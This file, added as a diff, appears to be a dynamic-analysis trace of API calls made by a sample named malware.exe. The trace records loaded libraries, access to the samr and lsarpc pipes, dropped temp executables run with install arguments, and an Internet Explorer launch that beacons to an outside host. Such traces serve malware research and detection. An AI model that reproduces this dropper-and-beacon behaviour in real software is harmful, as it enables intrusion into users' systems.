@@ -1,0 +1,179 @@
+3188 malware.exe
+#237610000
+LoadLibrary
+lpFileName=ntdll.dll
+Return=SUCCESS
+#237660000
+LoadLibrary
+lpFileName=ntdll.dll
+Return=SUCCESS
+#237670000
+LoadLibrary
+lpFileName=ntdll.dll
+Return=SUCCESS
+#237720000
+CreateFile
+hName=C:\Program
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=FAILURE
+#237740000
+CreateFile
+hName=C:\Program Files\Internet
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=FAILURE
+#239590000
+LoadLibrary
+lpFileName=VERSION.dll
+Return=SUCCESS
+#239740000
+CreateFile
+hName=C:\Program Files\Internet Explorer\IEXPLORE.EXE
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#239840000
+CreateFile
+hName=C:\Program Files\Internet Explorer\IEXPLORE.EXE
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#241710000
+RegQueryValue
+hKey=HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache
+Return=0
+#241740000
+LoadLibrary
+lpFileName=advapi32.dll
+Return=SUCCESS
+#237690000
+CreateProcessInternal
+lpCommandLine=C:\Program Files\Internet Explorer\iexplore.exe http://xytets.com:2345/t.asp?os=home
+Return=SUCCESS
+dwProcessId=3200
+dwThreadId=3204
+#237690000
+CreateProcessInternal
+lpCommandLine=C:\Program Files\Internet Explorer\iexplore.exe http://xytets.com:2345/t.asp?os=home
+Return=SUCCESS
+dwProcessId=3200
+dwThreadId=3204
+#237690000
+WinExec
+lpCmdLine=C:\Program Files\Internet Explorer\iexplore.exe http://xytets.com:2345/t.asp?os=home
+Return=SUCCESS
+#241990000
+CreateFile
+hName=\\.\NtHook
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=FAILURE
+#241990000
+CreateFile
+hName=\\.\NtHook
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=FAILURE
+#242790000
+LoadLibrary
+lpFileName=C:\WINDOWS\system32\IMM32.DLL
+Return=SUCCESS
+#244110000
+LoadLibrary
+lpFileName=gdi32.dll
+Return=SUCCESS
+#243470000
+LoadLibrary
+lpFileName=LPK.DLL
+Return=SUCCESS
+#242000000
+LoadLibrary
+lpFileName=SAMLIB.dll
+Return=SUCCESS
+#244430000
+RegQueryValue
+hKey=HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\MaxRpcSize
+Return=2
+#244540000
+LoadLibrary
+lpFileName=rpcrt4.dll
+Return=SUCCESS
+#244700000
+CreateFile
+hName=\\.\PIPE\samr
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#246000000
+CreateFile
+hName=\\.\PIPE\lsarpc
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#246170000
+CreateFile
+hName=\\.\PIPE\samr
+desiredAccess=GENERIC_READ GENERIC_WRITE 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#249340000
+CreateFile
+hName=C:\Documents and Settings\All Users\Desktop\malware.exe
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#249420000
+CreateFile
+hName=C:\Temp\pjhbzurmke.exe
+desiredAccess=GENERIC_WRITE 
+creationDisposition=CREATE_ALWAYS
+Return=SUCCESS
+#251090000
+LoadLibrary
+lpFileName=advapi32.dll
+Return=SUCCESS
+#249540000
+CreateProcessInternal
+lpCommandLine=C:\temp\CP.exe C:\Temp\pjhbzurmke.exe ups_run
+Return=SUCCESS
+dwProcessId=3216
+dwThreadId=3220
+#249540000
+CreateProcess
+lpCommandLine=C:\temp\CP.exe C:\Temp\pjhbzurmke.exe ups_run
+Return=SUCCESS
+dwProcessId=3216
+dwThreadId=3220
+#278750000
+DeleteFile
+fileName=C:\Temp\pjhbzurmke.exe
+Return=SUCCESS
+#282990000
+CreateFile
+hName=C:\Documents and Settings\All Users\Desktop\malware.exe
+desiredAccess=GENERIC_READ 
+creationDisposition=OPEN_EXISTING
+Return=SUCCESS
+#283330000
+CreateFile
+hName=C:\Temp\i_pjhbzurmke.exe
+desiredAccess=GENERIC_WRITE 
+creationDisposition=CREATE_ALWAYS
+Return=SUCCESS
+#287030000
+LoadLibrary
+lpFileName=advapi32.dll
+Return=SUCCESS
+#283480000
+CreateProcessInternal
+lpCommandLine=C:\temp\CP.exe C:\Temp\i_pjhbzurmke.exe ups_ins
+Return=SUCCESS
+dwProcessId=2044
+dwThreadId=192
+#283480000
+CreateProcess
+lpCommandLine=C:\temp\CP.exe C:\Temp\i_pjhbzurmke.exe ups_ins
+Return=SUCCESS
+dwProcessId=2044
+dwThreadId=192
